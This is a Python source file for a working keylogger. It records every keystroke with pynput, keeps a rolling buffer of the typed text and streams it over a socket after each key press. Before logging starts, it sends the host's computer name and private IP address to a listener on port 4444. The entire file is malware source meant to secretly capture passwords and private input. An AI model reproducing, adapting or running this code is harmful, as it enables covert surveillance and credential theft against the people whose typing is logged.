from win32api import GetComputerName
from pickle import dumps
import socket
from pynput import keyboard

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
words = ""


def rm_junks():
    global words
    if len(words) >= 400:
        additional = len(words) - 400
        words = words[additional:]
    else:
        pass


def on_press(key):
    global words
    """Callback function executed when a key is pressed."""
    try:
        words += str(key.char)
    except AttributeError:
        words += " {" + str(key).split('.')[1] + '} '
    rm_junks()
    sock.sendall(words.encode())


def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False


def get_ip() -> list:
    soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    soc.connect(("8.8.8.8", 80))
    private_ip = soc.getsockname()[0]
    name = GetComputerName()
    soc.close()
    data = [name, private_ip]
    return data


def connect(data_list: list):
    sock.connect(("127.0.0.1", 4444))
    while True:
        sock.sendall(dumps(data_list))
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
            break
    sock.close()


if __name__ == "__main__":
    data = get_ip()
    connect(data)
